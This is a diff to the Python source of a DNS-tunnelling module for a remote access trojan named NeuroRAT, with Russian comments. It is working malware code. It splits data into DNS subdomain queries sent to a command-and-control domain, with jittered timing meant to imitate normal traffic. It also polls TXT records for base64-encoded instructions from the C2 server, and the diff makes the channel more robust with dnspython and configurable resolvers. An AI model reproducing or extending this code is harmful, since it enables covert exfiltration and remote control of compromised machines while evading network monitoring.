@@ -9,22 +9,31 @@ import base64
 import time
 import random
 import socket
-import struct
-from common.utils import get_logger
-import logging
-import binascii
+# import struct # Больше не нужен для пакетов
+# import binascii # Используется только в _generate_session_id
 import threading
 from typing import Dict, List, Any, Optional, Tuple, Union, Callable
+# import logging # Уже импортировано через get_logger
+import binascii
 
-# DNS-заголовки и константы
-DNS_QUERY_TYPE_A = 1
-DNS_QUERY_TYPE_TXT = 16
-DNS_CLASS_IN = 1
+# Используем dnspython для работы с DNS
+import dns.resolver
+import dns.message
+import dns.query
+import dns.rdatatype
+import dns.rdataclass
+
+from common.utils import get_logger
+
+# DNS-заголовки и константы - теперь используются из dnspython
+# DNS_QUERY_TYPE_A = 1
+# DNS_QUERY_TYPE_TXT = 16
+# DNS_CLASS_IN = 1
 
 class DNSTunnel:
     """
     Класс для реализации DNS-туннелирования
-    Позволяет передавать данные, закодированные в DNS-запросах
+    Позволяет передавать данные, закодированные в DNS-запросах (и получать ответы)
     """
     
     def __init__(
@@ -33,7 +42,9 @@ class DNSTunnel:
         query_interval: float = 1.0,
         jitter: float = 0.3,
         max_chunk_size: int = 30,
-        callback: Optional[Callable[[bytes], None]] = None
+        callback: Optional[Callable[[bytes], None]] = None,
+        dns_server_ip: Optional[str] = None,
+        dns_server_port: Optional[int] = None
     ):
         """
         Инициализация DNS-туннеля
@@ -44,6 +55,8 @@ class DNSTunnel:
             jitter: Случайное отклонение для интервала (доля от интервала)
             max_chunk_size: Максимальный размер чанка для передачи
             callback: Колбэк для обработки полученных данных
+            dns_server_ip: IP конкретного DNS-сервера (если нужно использовать его)
+            dns_server_port: Порт конкретного DNS-сервера (если нужно использовать его)
         """
         self.c2_domain = c2_domain
         self.query_interval = query_interval
@@ -58,7 +71,24 @@ class DNSTunnel:
         
         # Настройка логирования
         self.logger = get_logger("dns_tunnel")
+
+        # Получаем системные DNS-серверы при инициализации
+        self._update_dns_servers()
     
+    def _update_dns_servers(self) -> None:
+        """Обновляет список системных DNS-серверов"""
+        try:
+            # Используем resolver из dnspython для получения системных серверов
+            self.dns_servers = dns.resolver.get_default_resolver().nameservers
+            if not self.dns_servers:
+                self.logger.warning("Не удалось определить системные DNS-серверы, используем Google DNS.")
+                self.dns_servers = ['8.8.8.8', '8.8.4.4']
+            else:
+                 self.logger.info(f"Используемые DNS-серверы: {self.dns_servers}")
+        except Exception as e:
+            self.logger.error(f"Ошибка при получении системных DNS-серверов: {e}. Используем Google DNS.")
+            self.dns_servers = ['8.8.8.8', '8.8.4.4']
+
     def _generate_session_id(self) -> str:
         """Генерирует уникальный идентификатор сессии"""
         return binascii.hexlify(os.urandom(4)).decode()
@@ -106,132 +136,227 @@ class DNSTunnel:
         success = True
         for i, chunk in enumerate(chunks):
             # Формируем поддомен с данными: [seq].[chunk].[session_id].[c2_domain]
-            seq = f"{i:02x}"
+            seq = f"{i:02x}" # Оставим последовательность для отладки на C2
             subdomain = f"{seq}.{chunk}.{self.session_id}.{self.c2_domain}"
             
-            # Отправляем DNS-запрос
+            # Отправляем DNS-запрос (тип A, т.к. ответ нас не интересует)
             try:
-                self._send_dns_query(subdomain, query_type=DNS_QUERY_TYPE_TXT)
+                # Ответ не обрабатываем, просто отправляем запрос
+                _ = self._send_dns_query(subdomain, query_type=dns.rdatatype.A)
                 # Добавляем случайную задержку для имитации реального трафика
                 jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
-                time.sleep(self.query_interval + jitter_value)
+                # Убедимся, что задержка не отрицательная
+                sleep_time = max(0, self.query_interval + jitter_value)
+                time.sleep(sleep_time)
             except Exception as e:
-                self.logger.error(f"Ошибка при отправке DNS-запроса: {e}")
+                self.logger.error(f"Ошибка при отправке DNS-запроса для данных: {e}")
                 success = False
+                # Можно добавить логику повторной отправки или выхода
         
-        self.sequence += 1
-        return success
+        # self.sequence += 1 # Последовательность для чанков, а не для сессии
+        
+        # Отправляем сигнал о завершении передачи, если все чанки ушли успешно
+        if success:
+            done_success = self._send_done_signal(len(chunks))
+            # Возвращаем успех, только если и данные, и сигнал ушли
+            return done_success
+        else:
+            # Если отправка данных не удалась, не отправляем DONE
+            return False
     
-    def _send_dns_query(self, domain: str, query_type: int = DNS_QUERY_TYPE_A) -> Optional[List[bytes]]:
+    def _send_done_signal(self, chunk_count: int) -> bool:
+        """Отправляет сигнал о завершении передачи данных"""
+        done_subdomain = f"done.{chunk_count}.{self.session_id}.{self.c2_domain}"
+        try:
+            # Отправляем DNS-запрос (тип A, т.к. ответ не важен, только доставка)
+            _ = self._send_dns_query(done_subdomain, query_type=dns.rdatatype.A)
+            self.logger.info(f"Отправлен сигнал DONE для сессии {self.session_id} ({chunk_count} чанков)")
+            return True
+        except Exception as e:
+            self.logger.error(f"Ошибка при отправке сигнала DONE: {e}")
+            return False
+    
+    def _send_dns_query(self, domain: str, query_type: dns.rdatatype.RdataType = dns.rdatatype.TXT) -> Optional[dns.message.Message]:
         """
-        Отправляет DNS-запрос к указанному домену
-        
+        Отправляет DNS-запрос к указанному домену с использованием dnspython.
+        Позволяет указать конкретный DNS-сервер и порт или использовать системные.
+
         Args:
             domain: Доменное имя для запроса
-            query_type: Тип DNS-запроса (A, TXT и т.д.)
-            
+            query_type: Тип DNS-запроса (dnspython RdataType)
+
         Returns:
-            Optional[List[bytes]]: Ответы на запрос или None
+            Optional[dns.message.Message]: Распарсенный ответ на запрос или None
         """
         try:
-            # Создаем DNS-пакет
-            # Заголовок: transaction ID, flags, counts
-            transaction_id = random.randint(0, 65535)
-            packet = struct.pack(">HHHHHH", 
-                transaction_id,  # Transaction ID
-                0x0100,          # Flags (стандартный запрос)
-                1,               # Questions count
-                0,               # Answer count
-                0,               # Authority count
-                0                # Additional count
-            )
-            
-            # Добавляем доменное имя в формате DNS (каждая часть предваряется длиной)
-            for part in domain.split('.'):
-                packet += struct.pack("B", len(part))
-                packet += part.encode()
-            
-            packet += struct.pack("B", 0)  # Завершающий нулевой байт
-            packet += struct.pack(">HH", query_type, DNS_CLASS_IN)  # QTYPE и QCLASS
-            
-            # Отправляем запрос к DNS-серверу
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(3.0)
-            
-            # Используем системный DNS-сервер
-            dns_server = self._get_system_dns_server()
-            sock.sendto(packet, (dns_server, 53))
-            
-            # Получаем ответ
-            response, _ = sock.recvfrom(4096)
-            sock.close()
-            
-            # Обрабатываем ответ (упрощенно)
-            if len(response) < 12:
-                return None
-                
-            # Парсим заголовок
-            header = struct.unpack(">HHHHHH", response[:12])
-            answer_count = header[3]
-            
-            if answer_count == 0:
-                return None
-                
-            # В реальном коде здесь должен быть полный парсинг DNS-ответа
-            # для извлечения полезной нагрузки из TXT-записей
-            
-            return [response]
-        
+            query_message = dns.message.make_query(domain, query_type)
+            response = None
+
+            # Если указан конкретный DNS-сервер и порт, используем их
+            if hasattr(self, 'dns_server_ip') and self.dns_server_ip and hasattr(self, 'dns_server_port') and self.dns_server_port:
+                server_ip = self.dns_server_ip
+                server_port = self.dns_server_port
+                self.logger.debug(f"Отправка DNS запроса на {domain} напрямую на {server_ip}:{server_port}")
+                try:
+                    response = dns.query.udp(query_message, server_ip, port=server_port, timeout=3.0)
+                    if response:
+                         rcode = response.rcode()
+                         if rcode == dns.rcode.NOERROR:
+                             self.logger.debug(f"Получен ответ от {server_ip}:{server_port} для {domain}")
+                             return response
+                         else:
+                             self.logger.warning(f"Указанный DNS-сервер {server_ip}:{server_port} вернул ошибку {dns.rcode.to_text(rcode)} для {domain}")
+                             # В случае ошибки от прямо указанного сервера, не пробуем другие
+                             return response # Возвращаем ответ с ошибкой
+                except dns.exception.Timeout:
+                     self.logger.warning(f"Таймаут при запросе к указанному DNS-серверу {server_ip}:{server_port} для {domain}")
+                     # Не пробуем другие, если сервер был указан явно
+                     return None
+                except Exception as e:
+                     self.logger.error(f"Ошибка при запросе к указанному DNS-серверу {server_ip}:{server_port} для {domain}: {e}")
+                     # Не пробуем другие
+                     return None
+
+            # Если конкретный сервер не указан, используем системные/дефолтные
+            else:
+                 self.logger.debug(f"Отправка DNS запроса на {domain} через системные DNS: {self.dns_servers}")
+                 for server in self.dns_servers:
+                     try:
+                         # Используем UDP-запрос на стандартный порт 53
+                         response = dns.query.udp(query_message, server, timeout=3.0)
+                         if response:
+                             # Проверяем RCODE (код ответа)
+                             rcode = response.rcode()
+                             if rcode == dns.rcode.NOERROR:
+                                 # Успешный ответ от этого сервера
+                                 self.logger.debug(f"Получен ответ от {server} для {domain}")
+                                 return response
+                             else:
+                                 self.logger.warning(f"Системный DNS-сервер {server} вернул ошибку {dns.rcode.to_text(rcode)} для {domain}")
+                                 # Пробуем следующий сервер
+                     except dns.exception.Timeout:
+                         self.logger.warning(f"Таймаут при запросе к системному DNS-серверу {server} для {domain}")
+                         # Пробуем следующий сервер
+                     except Exception as e:
+                         self.logger.error(f"Ошибка при запросе к системному DNS-серверу {server} для {domain}: {e}")
+                         # Пробуем следующий сервер
+
+            # Если ни один системный сервер не ответил успешно или был ответ с ошибкой от последнего
+            if response:
+                 self.logger.warning(f"Ни один из системных DNS-серверов ({self.dns_servers}) не дал успешного NOERROR ответа для {domain}. Возвращаем последний ответ.")
+                 return response # Возвращаем последний ответ (возможно, с ошибкой rcode)
+            else:
+                 # Сюда попадаем, если были только таймауты/ошибки связи со всеми системными серверами
+                 self.logger.error(f"Не удалось связаться ни с одним из системных DNS-серверов ({self.dns_servers}) для {domain}")
+                 return None
+
         except Exception as e:
-            self.logger.error(f"Ошибка DNS-запроса: {e}")
+            self.logger.error(f"Критическая ошибка при формировании/отправке DNS-запроса для {domain}: {e}")
+            # В случае серьезной ошибки (например, с dnspython), обновляем список серверов на всякий случай
+            self._update_dns_servers()
             return None
-    
-    def _get_system_dns_server(self) -> str:
-        """Получает адрес системного DNS-сервера"""
-        # В реальном коде здесь должна быть платформо-зависимая логика
-        # для получения системного DNS-сервера
-        # Для примера возвращаем Google DNS
-        return "8.8.8.8"
     
     def _receive_loop(self) -> None:
         """Цикл приема данных через DNS-туннель"""
         while self.is_running:
             try:
-                # Отправляем запрос на получение данных
+                # Отправляем запрос на получение данных (ожидаем TXT-запись)
                 poll_domain = f"poll.{self.session_id}.{self.c2_domain}"
-                responses = self._send_dns_query(poll_domain, query_type=DNS_QUERY_TYPE_TXT)
-                
-                if responses:
-                    # Обрабатываем полученные данные
-                    for response in responses:
-                        # В реальном коде здесь должно быть извлечение и декодирование данных
-                        # из TXT-записей DNS-ответа
-                        
-                        # Для простоты предположим, что ответ уже извлечен
-                        if self.callback:
-                            self.callback(response)
-                
+                response_message = self._send_dns_query(poll_domain, query_type=dns.rdatatype.TXT)
+
+                data_received = b""
+                if response_message and response_message.rcode() == dns.rcode.NOERROR:
+                    # Ищем ответ в секции Answer
+                    for answer in response_message.answer:
+                        if answer.rdtype == dns.rdatatype.TXT:
+                            # Извлекаем данные из TXT-записей
+                            # TXT запись может быть разбита на несколько строк (<255 байт каждая)
+                            for txt_string in answer.strings:
+                                try:
+                                    # Предполагаем, что данные закодированы в base64 C2-сервером
+                                    # (Более устойчиво к разным символам, чем base32)
+                                    # Убираем возможные кавычки, если сервер их добавляет
+                                    decoded_part = base64.b64decode(txt_string.strip(b'\"\''))
+                                    data_received += decoded_part
+                                except binascii.Error as decode_error:
+                                    self.logger.warning(f"Ошибка декодирования base64 из TXT ({txt_string}): {decode_error}")
+                                except Exception as e:
+                                    self.logger.error(f"Неожиданная ошибка при обработке TXT ({txt_string}): {e}")
+
+                if data_received and self.callback:
+                    try:
+                        self.logger.info(f"Получено {len(data_received)} байт данных через DNS")
+                        self.callback(data_received)
+                    except Exception as cb_error:
+                        self.logger.error(f"Ошибка при вызове callback: {cb_error}")
+
                 # Добавляем случайную задержку для имитации реального трафика
                 jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
-                time.sleep(self.query_interval + jitter_value)
-            
+                sleep_time = max(0, self.query_interval + jitter_value)
+                time.sleep(sleep_time)
+
+            except dns.resolver.NoResolverConfiguration:
+                 self.logger.error("Конфигурация DNS Resolver не найдена. Невозможно получить DNS-серверы.")
+                 # Обновляем на Google DNS и спим дольше перед повторной попыткой
+                 self.dns_servers = ['8.8.8.8', '8.8.4.4']
+                 time.sleep(self.query_interval * 5)
             except Exception as e:
-                self.logger.error(f"Ошибка в цикле приема: {e}")
-                time.sleep(self.query_interval)  # Продолжаем попытки
+                self.logger.exception(f"Критическая ошибка в цикле приема DNS: {e}") # Используем exception для stack trace
+                # В случае других серьезных ошибок, спим дольше перед повторной попыткой
+                time.sleep(self.query_interval * 5)
 
 # Тестирование модуля
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    
+    # Включим DEBUG для теста
+    import logging # Импортируем здесь, т.к. вверху закомментировали
+    logging.basicConfig(level=logging.DEBUG)
+
+    # --- Конфигурация из переменных окружения ---
+    # Домен C2, который настроен на DNS-сервер
+    test_c2_domain = os.getenv("AGENT_C2_DOMAIN", "test.neurorat.local") 
+    # IP или имя хоста DNS-сервера
+    test_dns_server = os.getenv("AGENT_DNS_SERVER_IP", "dns-server") # Имя сервиса в Docker
+    # Порт DNS-сервера
+    test_dns_port_str = os.getenv("AGENT_DNS_SERVER_PORT", "5333")
+    try:
+        test_dns_port = int(test_dns_port_str)
+    except ValueError:
+        print(f"Ошибка: Неверный формат порта DNS-сервера: {test_dns_port_str}. Используем 5333.")
+        test_dns_port = 5333
+
+    print(f"--- Конфигурация Агента ---")
+    print(f"C2 Domain: {test_c2_domain}")
+    print(f"DNS Server: {test_dns_server}:{test_dns_port}")
+    print(f"---------------------------")
+
     def data_callback(data: bytes) -> None:
-        print(f"Получены данные: {data}")
-    
-    tunnel = DNSTunnel(callback=data_callback)
+        try:
+            print(f"Получены данные: {data.decode('utf-8', errors='replace')}")
+        except Exception as e:
+            print(f"Ошибка декодирования callback данных: {e}, raw: {data}")
+
+    # Создаем туннель, указывая параметры из переменных окружения
+    tunnel = DNSTunnel(
+        c2_domain=test_c2_domain,
+        callback=data_callback,
+        query_interval=5,
+        dns_server_ip=test_dns_server,
+        dns_server_port=test_dns_port
+    )
     tunnel.start()
-    
+
     try:
         # Отправляем тестовое сообщение
-        tunnel.send(b"Hello from NeuroRAT!")
-        time.sleep(10)  # Даем время на обработку
+        print(f"Отправка тестового сообщения на {test_c2_domain}...")
+        tunnel.send(b"PING from NeuroRAT DNS Tunnel Client!")
+        print("Сообщение отправлено. Ожидание ответа от C2 (нужно настроить сервер)...")
+        # Даем время на получение ответа (если C2 настроен отвечать на poll.* запросы)
+        # C2 должен вернуть TXT запись на запрос poll.{session_id}.{test_c2_domain}
+        # с base64-кодированными данными
+        time.sleep(30)
+    except KeyboardInterrupt:
+        print("Прерывание пользователем.")
     finally:
-        tunnel.stop() 
+        print("Остановка туннеля...")
+        tunnel.stop()
+        print("Туннель остановлен.") 
